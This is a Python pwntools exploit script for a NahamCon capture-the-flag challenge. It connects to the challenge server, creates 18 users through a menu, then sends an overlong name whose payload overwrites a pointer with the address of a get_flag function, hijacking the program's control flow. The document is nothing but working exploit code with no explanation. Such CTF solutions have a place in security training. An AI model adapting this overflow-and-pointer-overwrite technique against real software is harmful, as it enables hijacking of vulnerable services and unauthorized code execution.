from pwn import *
get_flag = 0x401369
bin_flag = get_flag.to_bytes(4,'little') + b"\0"*4
bin_short_flag = b"\x69\x13\x40"
override =[]
for i in range(5):
    override.append(bin_flag)
override = b"".join(override)
print(override)
tmot = 1.0
io = remote('challenge.nahamcon.com', 32521)

def addUser(name):
    io.sendline("2")
    print(io.recv(timeout=tmot)) # Prompt
    io.sendline(name)
    print(io.recv(timeout=tmot)) # User added
    print(io.recv(timeout=tmot)) # Menu

def chgName(idx, data):
    io.sendline("4")
    print(io.recv(timeout=tmot))  # Prompt
    io.sendline("%d" % idx)
    print(io.recv(timeout=tmot))  # Prompt
    io.sendline(data)
    print(io.recv(timeout=tmot))  # Sucess

#unused handlers
def printUsers():
    io.sendline("1")
    print(io.recv(timeout=tmot))  # emptyLine
    print(io.recv(timeout=tmot))  # Prompt
def exitProg():
    io.sendline("5")
    print(io.recv(timeout=tmot))  # Prompt
def delUser(no):
    io.sendline("3")
    print(io.recv(timeout=tmot))  # Prompt
    io.sendline("%d" % no)
    print(io.recv(timeout=tmot))  # User deleted

print(io.recv()) # name
io.sendline("kubaa")
print(io.recv(timeout=tmot)) # Welcome name
print(io.recv(timeout=tmot)) # Menu

for i in range(18):
    addUser("x")

payload = b"\0"*0x1F + b"\0" + b'\0'*8 + bin_flag
print(hex(len(payload)))
print(payload + b"\0")
chgName(18, payload)

print("\r\n")
io.interactive(2)
